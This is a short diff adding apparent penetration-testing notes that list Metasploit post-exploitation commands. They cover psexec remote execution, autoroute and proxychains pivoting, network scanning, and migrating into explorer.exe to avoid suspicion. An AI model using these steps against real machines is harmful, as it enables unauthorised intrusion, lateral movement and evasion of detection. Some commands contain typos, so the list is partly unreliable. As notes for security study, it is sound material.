@@ -1,0 +1,13 @@
+shell # enter into the shell of the machine
+psexec # remote command execution for smb
+run autoroute -s ip #
+sessions # shows the all sessions created 
+use socks4a module #socks proxychaining
+cat /etc/proxychaining.conf #to view its port
+proxychains nmap routing_ip
+netstat -antp
+get uid
+sysinfo
+migrate -N explorer.exe #migrating to explorer.exe useful because it is legitimate process in all windows..so its less suspicious
+net view ip
+net use Drivecode: \\ip\Folder
